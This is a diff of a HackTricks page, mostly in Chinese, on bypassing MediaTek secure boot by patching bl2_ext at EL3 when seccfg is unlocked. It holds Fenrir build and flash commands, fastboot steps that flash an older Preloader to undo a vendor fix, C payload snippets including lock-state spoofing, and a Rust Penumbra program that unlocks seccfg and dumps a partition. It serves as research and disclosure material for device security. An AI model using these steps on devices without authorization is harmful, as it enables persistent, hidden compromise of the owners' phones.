@@ -2,144 +2,132 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-本页记录了在多个 MediaTek 平台上通过利用设备 bootloader 配置 (seccfg) 处于 "unlocked" 时的验证缺口实现的一个实用的 secure-boot 绕过。该缺陷允许在 ARM EL3 上运行经过修改的 bl2_ext 以禁用后续的签名验证，瓦解信任链并使加载任意未签名的 TEE/GZ/LK/Kernel 成为可能。
+本页记录了在多个 MediaTek 平台上利用 bootloader 配置 (seccfg) 为“unlocked”时的验证缺口进行实际 secure-boot 绕过的过程。该漏洞允许在 ARM EL3 上运行被修改的 bl2_ext，从而禁用下游签名验证，破坏信任链并允许加载任意未签名的 TEE/GZ/LK/Kernel。
 
-> 警告：早期引导时打补丁若偏移错误可能会永久使设备变砖。始终保留完整转储和可靠的恢复路径。
+> 警告：在早期引导阶段打补丁如果偏移错误可能会永久使设备变砖。始终保留完整转储和可靠的恢复路径。
 
-## 受影响的启动流程 (MediaTek)
+## Affected boot flow (MediaTek)
 
-- 正常路径：BootROM → Preloader → bl2_ext (EL3, verified) → TEE → GenieZone (GZ) → LK/AEE → Linux kernel (EL1)
-- 易受影响的路径：当 seccfg 设置为 unlocked 时，Preloader 可能会跳过对 bl2_ext 的验证。Preloader 仍会在 EL3 跳转到 bl2_ext，因此经过精心制作的 bl2_ext 可以随后加载未验证的组件。
+- Normal path: BootROM → Preloader → bl2_ext (EL3, verified) → TEE → GenieZone (GZ) → LK/AEE → Linux kernel (EL1)
+- Vulnerable path: When seccfg is set to unlocked, Preloader may skip verifying bl2_ext. Preloader still jumps into bl2_ext at EL3, so a crafted bl2_ext can load unverified components thereafter.
 
-关键的信任边界：
-- bl2_ext 在 EL3 执行，负责验证 TEE、GenieZone、LK/AEE 和内核。如果 bl2_ext 本身未被认证，链中其余部分就可以被轻易绕过。
+关键信任边界：
+- bl2_ext 在 EL3 运行并负责验证 TEE、GenieZone、LK/AEE 以及内核。如果 bl2_ext 本身未被认证，后续的信任链即可被轻易绕过。
 
-## 根本原因
+## Root cause
 
-在受影响的设备上，当 seccfg 指示为 "unlocked" 状态时，Preloader 不会强制对 bl2_ext 分区进行认证。这允许刷入一个受攻击者控制的 bl2_ext 并在 EL3 上运行。
+在受影响的设备上，当 seccfg 指示为 “unlocked” 状态时，Preloader 不会强制对 bl2_ext 分区进行认证。这允许刷入受攻击者控制的 bl2_ext 并在 EL3 上运行。
 
-在 bl2_ext 内，可以对验证策略函数进行补丁，使其无条件报告不需要验证。一个最小的概念性补丁为：
-```c
-// inside bl2_ext
-int sec_get_vfy_policy(...) {
-return 0; // always: "no verification required"
-}
-```
-在此更改后，由修补过的 bl2_ext 在 EL3 运行时加载的所有后续镜像（TEE、GZ、LK/AEE、Kernel）在被接受时将不进行加密校验。
+在 bl2_ext 内，验证策略函数可以被打补丁，使其无条件报告不需要验证（或总是返回成功），强制引导链接受未签名的 TEE/GZ/LK/Kernel 镜像。因为该补丁在 EL3 运行，即使下游组件自身也实现了检查，这个绕过仍然有效。
 
-## 如何排查目标（expdb 日志）
+## Practical exploit chain
 
-在 bl2_ext 加载前后转储/检查引导日志（例如 expdb）。如果 img_auth_required = 0 且 certificate verification time 约为 ~0 ms，则强制验证很可能已被禁用，设备可能可被利用。
+1. 通过 OTA/firmware packages、EDL/DA 读回或硬件转储获取 bootloader 分区（Preloader、bl2_ext、LK/AEE 等）。
+2. 定位 bl2_ext 的验证例程并打补丁，使其始终跳过/接受验证。
+3. 使用 fastboot、DA 或在 unlocked 设备上仍被允许的类似维护通道刷写修改后的 bl2_ext。
+4. 重启；Preloader 跳转到被修改的 bl2_ext（EL3），随后加载未签名的下游镜像（修改过的 TEE/GZ/LK/Kernel），并禁用签名强制执行。
 
-示例日志节选：
+如果设备配置为 locked（seccfg locked），Preloader 预计会验证 bl2_ext。在该配置下，除非存在其他漏洞允许加载未签名的 bl2_ext，否则此攻击将失败。
+
+## Triage (expdb boot logs)
+
+- 在 bl2_ext 加载周围转储 boot/expdb 日志。如果 `img_auth_required = 0` 且证书验证时间约为 ~0 ms，则很可能跳过了验证。
+
+Example log excerpt:
 ```
 [PART] img_auth_required = 0
 [PART] Image with header, name: bl2_ext, addr: FFFFFFFFh, mode: FFFFFFFFh, size:654944, magic:58881688h
 [PART] part: lk_a img: bl2_ext cert vfy(0 ms)
 ```
-Note: Some devices reportedly skip bl2_ext verification even with a locked bootloader, which exacerbates the impact.
+- 一些设备即便已锁定也会跳过 bl2_ext 验证；lk2 的 secondary bootloader 路径也显示出同样的缺口。如果 post-OTA Preloader 在已解锁状态下记录了 `img_auth_required = 1` 对 bl2_ext，说明强制执行很可能已恢复。
 
-Devices that ship the lk2 secondary bootloader have been observed with the same logic gap, so grab expdb logs for both bl2_ext and lk2 partitions to confirm whether either path enforces signatures before you attempt porting.
+## Verification logic locations
 
-If a post-OTA Preloader now logs img_auth_required = 1 for bl2_ext even while seccfg is unlocked, the vendor likely closed the gap—see the OTA persistence notes below.
+- 相关检查通常位于 bl2_ext 镜像内部，函数名类似于 `verify_img` 或 `sec_img_auth`。
+- 被修补的版本会强制该函数返回成功，或完全绕过验证调用。
 
-## 实战利用流程 (Fenrir PoC)
+Example patch approach (conceptual):
+- 定位调用 `sec_img_auth` 对 TEE、GZ、LK 和 kernel 镜像进行验证的函数。
+- 将其函数体替换为立即返回成功的存根，或覆盖处理验证失败的条件分支。
 
-Fenrir 是一个针对此类问题的参考 exploit/patching 工具包。它支持 Nothing Phone (2a) (Pacman)，并且已知在 CMF Phone 1 (Tetris) 上可运行（支持不完整）。将其移植到其他型号需要对设备特定的 bl2_ext 进行逆向工程。
+确保补丁保留栈/帧设置并向调用者返回预期的状态码。
 
-High-level process:
-- 获取目标代号的设备 bootloader 镜像，并将其放置为 `bin/<device>.bin`
-- 构建一个已打补丁的镜像以禁用 bl2_ext 验证策略
-- 将生成的 payload 刷入设备（helper 脚本假定使用 fastboot）
+## Fenrir PoC workflow (Nothing/CMF)
 
-Commands:
+Fenrir 是针对该问题的参考修补工具集（Nothing Phone (2a) 完全支持；CMF Phone 1 部分支持）。总体流程：
+- 将设备 bootloader 镜像放为 `bin/<device>.bin`。
+- 构建一个禁用 bl2_ext 验证策略的已修补镜像。
+- 刷写生成的 payload（提供 fastboot helper）。
 ```bash
-# Build patched image (default path bin/[device].bin)
-./build.sh pacman
-
-# Build from a custom bootloader path
-./build.sh pacman /path/to/your/bootloader.bin
-
-# Flash the resulting lk.patched (fastboot required by the helper script)
-./flash.sh
+./build.sh pacman                    # build from bin/pacman.bin
+./build.sh pacman /path/to/boot.bin  # build from a custom bootloader path
+./flash.sh                           # flash via fastboot
 ```
-If fastboot is unavailable, you must use a suitable alternative flashing method for your platform.
+Use another flashing channel if fastboot is unavailable.
 
-### OTA 已修补固件: keeping the bypass alive (NothingOS 4, late 2025)
+## EL3 patching notes
 
-Nothing 在 2025 年 11 月的 NothingOS 4 稳定 OTA (build BP2A.250605.031.A3) 中修补了 Preloader，以便即使 seccfg 已解锁也强制执行 bl2_ext 验证。Fenrir `pacman-v2.0` 通过将易受攻击的 NOS 4 beta 的 Preloader 与稳定的 LK payload 混合使用再次有效：
-```bash
-# on Nothing Phone (2a), unlocked bootloader, in bootloader (not fastbootd)
-fastboot flash preloader_a preloader_raw.img   # beta Preloader bundled with fenrir release
-fastboot flash lk pacman-fenrir.bin            # patched LK containing stage hooks
-fastboot reboot                                # factory reset may be needed
-```
-Important:
-- Flash the provided Preloader **only** to the matching device/slot; a wrong preloader is an instant hard brick.
-- Check expdb after flashing; img_auth_required should drop back to 0 for bl2_ext, confirming that the vulnerable Preloader is executing before your patched LK.
-- If future OTAs patch both Preloader and LK, keep a local copy of a vulnerable Preloader to re‑introduce the gap.
+- bl2_ext executes in ARM EL3. Crashes here can brick a device until reflashed via EDL/DA or test points.
+- 使用板级特定的 logging/UART 来验证执行路径并诊断崩溃。
+- 保留所有被修改分区的备份，并首先在可丢弃的硬件上进行测试。
 
-### Build automation & payload debugging
+## Implications
 
-- `build.sh` now auto-downloads and exports the Arm GNU Toolchain 14.2 (aarch64-none-elf) the first time you run it, so you do not have to juggle cross-compilers manually.
-- Export `DEBUG=1` before invoking `build.sh` to compile payloads with verbose serial prints, which greatly helps when you are blind-patching EL3 code paths.
-- Successful builds drop both `lk.patched` and `<device>-fenrir.bin`; the latter already has the payload injected and is what you should flash/boot-test.
+- 在 Preloader 之后实现 EL3 代码执行，将导致剩余引导路径的完整信任链坍塌。
+- 能够引导未签名的 TEE/GZ/LK/Kernel，绕过 secure/verified boot 的预期并实现持久妥协。
 
-## Runtime payload capabilities (EL3)
-
-A patched bl2_ext payload can:
-- Register custom fastboot commands
-- Control/override boot mode
-- Dynamically call built‑in bootloader functions at runtime
-- Spoof “lock state” as locked while actually unlocked to pass stronger integrity checks (some environments may still require vbmeta/AVB adjustments)
-
-Limitation: Current PoCs note that runtime memory modification may fault due to MMU constraints; payloads generally avoid live memory writes until this is resolved.
-
-## Payload staging patterns (EL3)
-
-Fenrir splits its instrumentation into three compile-time stages: stage1 runs before `platform_init()`, stage2 runs before LK signals fastboot entry, and stage3 executes immediately before LK loads Linux. Each device header under `payload/devices/` provides the addresses for these hooks plus fastboot helper symbols, so keep those offsets synchronized with your target build.
-
-Stage2 is a convenient location to register arbitrary `fastboot oem` verbs:
-```c
-void cmd_r0rt1z2(const char *arg, void *data, unsigned int sz) {
-video_printf("r0rt1z2 was here...\n");
-fastboot_info("pwned by r0rt1z2");
-fastboot_okay("");
-}
-
-__attribute__((section(".text.main"))) void main(void) {
-fastboot_register("oem r0rt1z2", cmd_r0rt1z2, true, false);
-notify_enter_fastboot();
-}
-```
-Stage3 演示如何临时翻转页表属性以修补不可变字符串，例如 Android 的 “Orange State” 警告，而无需下游内核访问：
-```c
-set_pte_rwx(0xFFFF000050f9E3AE);
-strcpy((char *)0xFFFF000050f9E3AE, "Patched by stage3");
-```
-因为 stage1 在 platform bring-up 之前触发，这是调用 OEM power/reset primitives 或在 verified boot chain 被拆除之前插入额外完整性日志的合适位置。
-
-## 移植提示
-
-- 对设备特定的 bl2_ext 进行逆向工程，以定位验证策略逻辑（例如 sec_get_vfy_policy）。
-- 确定策略的返回点或决策分支，并将其修补为 “no verification required”（return 0 / unconditional allow）。
-- 保持偏移完全针对具体设备和固件；不要在不同变体间重用地址。
-- 先在牺牲设备上验证。刷写前准备好恢复计划（例如 EDL/BootROM loader/SoC-specific download mode）。
-- 使用 lk2 二级引导程序或即使在锁定状态下仍报告 bl2_ext 为 “img_auth_required = 0” 的设备，应视为该漏洞类别的易受攻击副本；已观察到 Vivo X80 Pro 即使报告为锁定状态也跳过验证。
-- 当 OTA 开始在解锁状态下强制 bl2_ext 签名（img_auth_required = 1）时，检查是否可以刷入较旧的 Preloader（常见于 beta OTA）以重新打开漏洞，然后使用针对新版 LK 更新的偏移重新运行 fenrir。
-
-## 安全影响
-
-- 在 Preloader 之后实现 EL3 代码执行，并导致其余引导路径的完整信任链完全崩溃。
-- 能够启动未签名的 TEE/GZ/LK/Kernel，绕过 secure/verified boot 的期望，从而实现持久化妥协。
-
-## 设备备注
+## Device notes
 
 - 已确认支持：Nothing Phone (2a) (Pacman)
-- 已知可用（支持不完整）：CMF Phone 1 (Tetris)
-- 已观测：据报道 Vivo X80 Pro 即使在锁定时也未验证 bl2_ext
-- NothingOS 4 stable (BP2A.250605.031.A3, Nov 2025) 重新启用了 bl2_ext 验证；fenrir `pacman-v2.0` 通过刷入 beta Preloader 加上补丁后的 LK（如上所示）恢复了绕过
-- 行业报道强调其他基于 lk2 的厂商也存在相同的逻辑缺陷，因此预计在 2024–2025 年的 MTK 发布中会有更多重叠。
+- 已知可工作（支持不完整）：CMF Phone 1 (Tetris)
+- 观察到：据报道 Vivo X80 Pro 即使在锁定状态也不验证 bl2_ext
+- NothingOS 4 stable (BP2A.250605.031.A3, Nov 2025) 重新启用 bl2_ext 验证；fenrir `pacman-v2.0` 通过将 beta Preloader 与已修补的 LK 混合来恢复该绕过
+- 行业报道指出还有更多基于 lk2 的厂商带有相同的逻辑缺陷，因此预计 2024–2025 年的 MTK 版本会有更多重叠。
+
+## MTK DA readback and seccfg manipulation with Penumbra
+
+Penumbra is a Rust crate/CLI/TUI that automates interaction with MTK preloader/bootrom over USB for DA-mode operations. 在对易受影响的手持设备具有物理访问权限（允许 DA extensions）时，它可以发现 MTK USB 端口、加载 Download Agent (DA) blob，并发出特权命令，例如 seccfg 锁状态翻转和分区读回。
+
+- **Environment/driver setup**: 在 Linux 上安装 `libudev`，将用户加入 `dialout` 组，并创建 udev 规则或在设备节点不可访问时使用 `sudo` 运行。Windows 支持不可靠；有时只有在使用 Zadig 将 MTK 驱动替换为 WinUSB 后才可工作（参见项目说明）。
+- **Workflow**: 读取 DA 有效载荷（例如 `std::fs::read("../DA_penangf.bin")`），使用 `find_mtk_port()` 轮询 MTK 端口，并使用 `DeviceBuilder::with_mtk_port(...).with_da_data(...)` 构建会话。在 `init()` 完成握手并收集设备信息后，通过 `dev_info.target_config()` 的位字段检查保护（位 0 被设置 → SBC 已启用）。进入 DA 模式并尝试 `set_seccfg_lock_state(LockFlag::Unlock)`——只有在设备接受 extensions 时此操作才会成功。可以使用 `read_partition("lk_a", &mut progress_cb, &mut writer)` 将分区导出以便离线分析或修补。
+- **Security impact**: 成功解除 seccfg 锁定会重新打开对未签名引导镜像的刷写路径，从而使如上所述的 bl2_ext EL3 打补丁之类的持久性妥协成为可能。分区读回提供了用于逆向工程和制作修改镜像的固件工件。
+
+<details>
+<summary>Rust DA session + seccfg unlock + partition dump (Penumbra)</summary>
+```rust
+use tokio::fs::File;
+use anyhow::Result;
+use penumbra::{DeviceBuilder, LockFlag, find_mtk_port};
+use tokio::io::{AsyncWriteExt, BufWriter};
+
+#[tokio::main]
+async fn main() -> Result<()> {
+let da = std::fs::read("../DA_penangf.bin")?;
+let mtk_port = loop {
+if let Some(port) = find_mtk_port().await {
+break port;
+}
+};
+
+let mut dev = DeviceBuilder::default()
+.with_mtk_port(mtk_port)
+.with_da_data(da)
+.build()?;
+
+dev.init().await?;
+let cfg = dev.dev_info.target_config().await;
+println!("SBC: {}", (cfg & 0x1) != 0);
+
+dev.set_seccfg_lock_state(LockFlag::Unlock).await?;
+
+let mut progress = |_read: usize, _total: usize| {};
+let mut writer = BufWriter::new(File::create("lk_a.bin")?);
+dev.read_partition("lk_a", &mut progress, &mut writer).await?;
+writer.flush().await?;
+Ok(())
+}
+```
+</details>
 
 ## 参考资料
 
@@ -147,5 +135,6 @@ strcpy((char *)0xFFFF000050f9E3AE, "Patched by stage3");
 - [Cyber Security News – PoC Exploit Released For Nothing Phone Code Execution Vulnerability](https://cybersecuritynews.com/nothing-phone-code-execution-vulnerability/)
 - [Fenrir pacman-v2.0 release (NothingOS 4 bypass bundle)](https://github.com/R0rt1z2/fenrir/releases/tag/pacman-v2.0)
 - [The Cyber Express – Fenrir PoC breaks secure boot on Nothing Phone 2a/CMF1](https://thecyberexpress.com/fenrir-poc-for-nothing-phone-2a-cmf1/)
+- [Penumbra – MTK DA flash/readback & seccfg tooling](https://github.com/shomykohai/penumbra)
 
 {{#include ../../banners/hacktricks-training.md}}
